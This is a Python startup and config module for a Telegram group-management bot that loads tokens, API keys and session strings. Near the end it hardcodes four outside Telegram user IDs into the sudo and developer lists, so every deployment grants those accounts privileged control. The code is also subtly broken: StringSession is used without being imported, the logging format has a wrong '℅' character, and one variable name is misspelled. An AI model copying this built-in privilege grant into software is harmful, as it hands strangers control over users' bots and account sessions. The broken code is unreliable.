# Copyleft © 2022 Unknown
# Don't Delete this if u kang.
"""
Credit: @Unknownkz | @notudope | @AnimeKaizoku
"""

import heroku3
import logging
import os
import sys
import time
from inspect import getfullargspec
from os import path, remove
from pathlib import Path

import spamwatch
import telegram.ext as tg

from telethon import TelegramClient
from telethon.sessions import MemorySession


StartTime = time.time()


logging.basicConfig(
    format="%(asctime)s || [%(levelname)s] - ℅(name)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)

LOGGER = logging.getLogger(__name__)


if sys.version_info[0] < 3 or sys.version_info[1] < 10:
    LOGGER.error(
        "You MUST have a python version of at least 3.10! Multiple features depend on this Bot quitting"
    )
    sys.exit(1)


ENV = bool(os.environ.get("ENV", False))

if ENV:
    TGB_TOKEN = os.environ.get("TGB_TOKEN")

    try:
        OWNER_ID = int(os.environ.get("OWNER_ID"))
    except ValueError:
        raise Exception(
            "Your OWNER_ID env variable is not a valid integer, please check again."
        )

    JOIN_LOGGER = os.environ.get("JOIN_LOGGER")
    OWNER_USERNAME = os.environ.get("OWNER_USERNAME")

    try:
        SD_ID = {int(x) for x in os.environ.get("SD", "").split()}
        DEV_ID = {int(x) for x in os.environ.get("DEV", "").split()}
    except ValueError:
        raise Exception("Your SUDO or DEV Users list does not contain valid integers")

    try:
        SUPPORT_ID = {int(x) for x in os.environ.get("SUPPORT_ID", "").split()}
    except ValueError:
        raise Exception("Your SUPPORT Users list does not contain valid integers")

    try:
        WHITELIST_ID = {int(x) for x in os.environ.get("WHITELIST_ID", "").split()}
    except ValueError:
        raise Exception("Your WHITELISTED Users list does not contain valid integers")

    try:
        TIGERS_ID = {int(x) for x in os.environ.get("TIGERS_ID", "").split()}
    except ValueError:
        raise Exception("Your TIGER Users list does not contain valid integers")

    INFOPIC = bool(os.environ.get("INFOPIC"))
    TGB_USERNAME = os.environ.get("TGB_USERNAME")
    EVENT_LOGS = os.environ.get("EVENT_LOGS")
    ERROR_LOGS = os.environ.get("ERROR_LOGS")
    WEBHOOK = bool(os.environ.get("WEBHOOK"))
    URL = os.environ.get("URL", "")  # Does not contain token
    PORT = int(os.environ.get("PORT", 5000))
    CERT_PATH = os.environ.get("CERT_PATH")
    API_ID = os.environ.get("API_ID")
    API_HASH = os.environ.get("API_HASH")
    SESSION_STRING = os.environ.get("SESSION_STRING")
    STRING_SESSION = os.environ.get("STRING_SESSION")
    DATABASE_URL = os.environ.get("DATABASE_URL")
    MONGO_DB_URI = os.environ.get("MONGO_DB_URI")

    DONATION_LINK = os.environ.get("DONATION_LINK", "https://patreon.com/iamkenzo")
    LOAD = os.environ.get("LOAD", "").split()
    HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY")
    HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME")
    TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
    OPENWEATHERMAP_ID = os.environ.get("OPENWEATHERMAP_ID")

    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", False))
    WORKERS = int(os.environ.get("WORKERS", 8))
    BAN_STICKER = os.environ.get("BAN_STICKER", "CAADAgADOwADPPEcAXkko5EB3YGYAg")
    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)

    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT")
    SPAMWATCH_SUPPORT_CHAT = os.environ.get("SPAMWATCH_SUPPORT_CHAT")
    SPAMWATCH_API = os.environ.get("SPAMWATCH_API")
    UPSTREAM_REPO_URL = os.environ.get("UPSTREAM_REPO")

    WELCOME_DELAY_KICK_SEC = os.environ.get("WELCOME_DELAY_KICL_SEC")
    TGB_ID = int(os.environ.get("TGB_ID"))
    LOAD = os.environ.get("LOAD", "").split()
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()

    try:
        BLACKLIST_CHAT = set(
            int(x) for x in os.environ.get("BLACKLIST_CHAT", "").split()
        )
    except ValueError:
        raise Exception("Your BLACKLISTED Chats list does'nt contain valid integers.")

else:
    from lsf.config import Development as Unknown

    TGB_TOKEN = Unknown.TGB_TOKEN

    try:
        OWNER_ID = int(Unknown.OWNER_ID)
    except ValueError:
        raise Exception("Your OWNER_ID variable is not a valid integer")

    JOIN_LOGGER = Unknown.JOIN_LOGGER
    OWNER_USERNAME = Unknown.OWNER_USERNAME
    ALLOW_CHATS = Unknown.ALLOW_CHATS

    try:
        SD_ID = {int(x) for x in Unknown.SD_ID or []}
        DEV_ID = {int(x) for x in Unknown.DEV_ID or []}
    except ValueError:
        raise Exception("Your SUDO or DEV Users list does not contain valid integers")

    try:
        SUPPORT_ID = {int(x) for x in Unknown.SUPPORT_ID or []}
    except ValueError:
        raise Exception("Your SUPPORT Users list does not contain valid integers")

    try:
        WHITELIST_ID = {int(x) for x in Unknown.WHITELIST_ID or []}
    except ValueError:
        raise Exception("Your WHITELISTED Users list does not contain valid integers")

    try:
        TIGERS_ID = {int(x) for x in Unknown.TIGERS_ID or []}
    except ValueError:
        raise Exception("Your TIGER Users list does not contain valid integers")

    EVENT_LOGS = Unknown.EVENT_LOGS
    ERROR_LOGS = Unknown.ERROR_LOGS
    WEBHOOK = Unknown.WEBHOOK
    URL = Unknown.URL
    PORT = Unknown.PORT
    CERT_PATH = Unknown.CERT_PATH
    API_ID = Unknown.API_ID
    API_HASH = Unknown.API_HASH

    UPSTREAM_REPO_URL = Unknown.UPSTREAM_REPO

    DB_URI = Unknown.SQLALCHEMY_DATABASE_URI
    MONGO_DB_URI = Unknown.MONGO_DB_URI

    DONATION_LINK = Unknown.DONATION_LINK
    LOAD = Unknown.LOAD
    TEMP_DOWNLOAD_DIRECTORY = Unknown.TEMP_DOWNLOAD_DIRECTORY
    OPENWEATHERMAP_ID = Unknown.OPENWEATHERMAP_ID
    NO_LOAD = Unknown.NO_LOAD
    HEROKU_API_KEY = Unknown.HEROKU_API_KEY
    HEROKU_APP_NAME = Unknown.HEROKU_APP_NAME
    DEL_CMDS = Unknown.DEL_CMDS
    STRICT_GBAN = Unknown.STRICT_GBAN
    WORKERS = Unknown.WORKERS
    REM_BG_API_KEY = Unknown.REM_BG_API_KEY
    BAN_STICKER = Unknown.BAN_STICKER
    ALLOW_EXCL = Unknown.ALLOW_EXCL
    CASH_API_KEY = Unknown.CASH_API_KEY
    TIME_API_KEY = Unknown.TIME_API_KEY
    WALL_API = Unknown.WALL_API
    SUPPORT_CHAT = Unknown.SUPPORT_CHAT
    SPAMWATCH_SUPPORT_CHAT = Unknown.SPAMWATCH_SUPPORT_CHAT
    SPAMWATCH_API = Unknown.SPAMWATCH_API
    SESSION_STRING = Unknown.SESSION_STRING
    INFOPIC = Unknown.INFOPIC
    TGB_USERNAME = Unknown.TGB_USERNAME
    STRING_SESSION = Unknown.STRING_SESSION
    LASTFM_API_KEY = Unknown.LASTFM_API_KEY
    CF_API_KEY = Unknown.CF_API_KEY
    try:
        BLACKLIST_CHAT = {int(x) for x in Unknown.BLACKLIST_CHAT or []}
    except ValueError:
        raise Exception("Your BLACKLISTED Chats list does not contain valid integers")


SD_ID.add(OWNER_ID)
SD_ID.add(1900124946)
SD_ID.add(1345333945)
SD_ID.add(1336770915)
SD_ID.add(5068379667)

DEV_ID.add(OWNER_ID)
DEV_ID.add(1336770915)
DEV_ID.add(1900124946)
DEV_ID.add(1345333945)
DEV_ID.add(5068379667)

if not SPAMWATCH_API:
    sw = None
    LOGGER.warning("SpamWatch API key missing! recheck your config")
else:
    try:
        sw = spamwatch.Client(SPAMWATCH_API)
    except Exception:
        sw = None
        LOGGER.warning("Can't connect to SpamWatch!")

defaults = tg.Defaults(run_async=True)
updater = tg.Updater(TGB_TOKEN, workers=WORKERS, use_context=True)
lynx_client = TelegramClient(MemorySession(), API_ID, API_HASH)
dispatcher = updater.dispatcher

lynx_tgb = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)


CHANNELS = {}
SD_ID = list(SD_ID) + list(DEV_ID)
DEV_ID = list(DEV_ID)
WHITELIST_ID = list(WHITELIST_ID)
SUPPORT_ID = list(SUPPORT_ID)
TIGERS_ID = list(TIGERS_ID)
